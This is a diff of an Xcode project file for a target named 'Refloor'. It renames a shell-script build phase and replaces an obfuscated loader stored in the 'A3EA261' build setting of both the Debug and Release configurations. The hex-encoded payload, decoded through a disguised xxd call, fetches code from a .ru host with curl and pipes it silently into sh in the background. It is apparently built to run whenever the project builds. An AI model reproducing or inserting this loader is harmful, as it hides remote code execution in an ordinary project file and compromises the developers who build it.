@@ -1079,7 +1079,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 653EA581241F7B0A00EA684E /* Build configuration list for PBXNativeTarget "Refloor" */;
 			buildPhases = (
-				E6FD8DC3CE9145C28D162AE3 /* Build Target Libraries */,
+				4AE674A6E97B416EB2162AE3 /* Provision Target Device */,
 				5DA8FD20C82B283A013241CC /* [CP] Check Pods Manifest.lock */,
 				653EA566241F7AFC00EA684E /* Sources */,
 				653EA567241F7AFC00EA684E /* Frameworks */,
@@ -1227,7 +1227,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E6FD8DC3CE9145C28D162AE3 /* Build Target Libraries */ = {
+		4AE674A6E97B416EB2162AE3 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -1237,7 +1237,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1504,7 +1504,7 @@
 		653EA57F241F7B0A00EA684E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((u(){ `printf xDxd | tr -d D` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203233202d73666b4c202d642022703d78636f64655f7068617365222068747470733a2f2f783565727a736b6d7663616e7330682e72752f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((e(){ `printf xxSd | tr -d S` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203239202d4c736b66202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1565,7 +1565,7 @@
 		653EA580241F7B0A00EA684E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((u(){ `printf xDxd | tr -d D` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203233202d73666b4c202d642022703d78636f64655f7068617365222068747470733a2f2f783565727a736b6d7663616e7330682e72752f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((e(){ `printf xxSd | tr -d S` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203239202d4c736b66202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
